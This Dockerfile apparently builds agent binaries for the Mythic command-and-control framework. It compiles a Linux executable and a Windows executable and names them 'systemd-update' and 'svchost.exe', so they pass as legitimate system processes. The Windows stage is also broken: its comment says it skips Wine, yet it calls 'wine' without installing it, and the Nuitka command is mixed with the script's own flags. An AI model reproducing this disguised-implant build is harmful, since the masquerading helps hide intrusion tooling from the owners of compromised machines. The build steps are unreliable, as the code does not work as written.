# Stage 1: Linux executable build
FROM python:3.9-slim AS linux-build

WORKDIR /Mythic/

# Install PyInstaller directly
RUN pip install pyinstaller mythic-container

# Copy source code
COPY . /Mythic/

# Create directory for build artifacts
RUN mkdir -p /tmp/build_cache
ENV PYINSTALLER_CACHE_DIR=/tmp/build_cache

# Run PyInstaller to build Linux executable
RUN python3 main.py --target-os linux

# Stage 2: Windows executable build (skip Wine, use alternative)
FROM python:3.9-slim AS windows-build

WORKDIR /Mythic/

# Install cross-compilation tools
RUN apt-get update && \
    apt-get install -y gcc-mingw-w64 && \
    pip install nuitka mythic-container && \
    rm -rf /var/lib/apt/lists/*
RUN wine python3 -m pip install pyinstaller

# Copy source code
COPY . /Mythic/

# Create directory for build artifacts
RUN mkdir -p /tmp/build_cache
ENV PYINSTALLER_CACHE_DIR=/tmp/build_cache

# Run Nuitka to build Windows executable
RUN python -m nuitka --onefile --mingw64 main.py --target-os windows

# Stage 3: Collect artifacts
FROM python:3.9-slim AS final

WORKDIR /artifacts/

# Copy Linux executable
COPY --from=linux-build /Mythic/dist/systemd-update /artifacts/systemd-update

# Copy Windows executable
COPY --from=windows-build /Mythic/dist/svchost.exe /artifacts/svchost.exe

# Keep container running for artifact retrieval
CMD ["bash", "-c", "ls -l /artifacts/ && sleep infinity"]